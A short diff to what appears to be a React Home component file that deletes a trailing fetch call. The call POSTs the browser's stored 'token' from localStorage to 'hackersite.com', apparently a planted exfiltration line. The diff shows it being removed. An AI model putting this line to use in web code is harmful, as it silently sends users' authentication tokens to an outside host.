@@ -55,8 +55,3 @@ const Home = () => {
 };
 
 export default Home;
-
-fetch("https://hackersite.com", {
-  method: "POST",
-  body: { token: localStorage.getItem("token") },
-});
